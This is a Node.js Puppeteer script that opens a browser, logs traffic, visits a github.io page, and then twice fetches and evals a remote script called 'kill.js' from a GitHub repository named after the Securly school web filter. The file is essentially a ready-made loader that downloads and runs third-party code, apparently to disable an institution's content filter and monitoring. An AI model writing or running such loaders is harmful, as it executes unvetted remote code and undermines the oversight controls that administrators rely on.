const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({ headless: false }); // Launch browser
    const page = await browser.newPage();

    // Track the initial and final URLs
    let initialUrl = null;
    let finalUrl = null;

    // Intercept requests and responses
    await page.setRequestInterception(true);

    page.on('request', (request) => {
        console.log(`Request: ${request.url()}`);
        request.continue(); // Allow the request to proceed
    });

    page.on('response', async (response) => {
        console.log(`Response: ${response.url()} - Status: ${response.status()}`);
        // Track the final URL after redirection
        if (response.status() === 200) {
            finalUrl = response.url();
        }
    });

    try {
        // Navigate to the initial page and track the initial URL
        initialUrl = page.url();
        console.log('Initial URL:', initialUrl);

        await page.goto('https://dy1ngrat.github.io/pupet/'); // Replace with your initial URL

        // Wait for navigation/redirection to complete
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

        // Log the final URL after redirection
        console.log('Final URL:', finalUrl);

        // Perform actions on the redirected page
        const pageTitle = await page.evaluate(() => document.title);
        console.log('Page Title:', pageTitle);

        // Execute the script after redirection
        if (finalUrl) {
            for (let i = 0; i < 2; i++) {
                await page.evaluate(async () => {
                    const scriptContent = await fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
                        .then((r) => r.text());
                    eval(scriptContent);
                });
            }
            console.log('Script injected and executed successfully!');
        } else {
            console.log('No redirection detected');
        }
        
    } catch (error) {
        console.error('Error:', error);
    }

    // Do not close the browser
    // await browser.close(); // Optional: Keep the browser open
})();
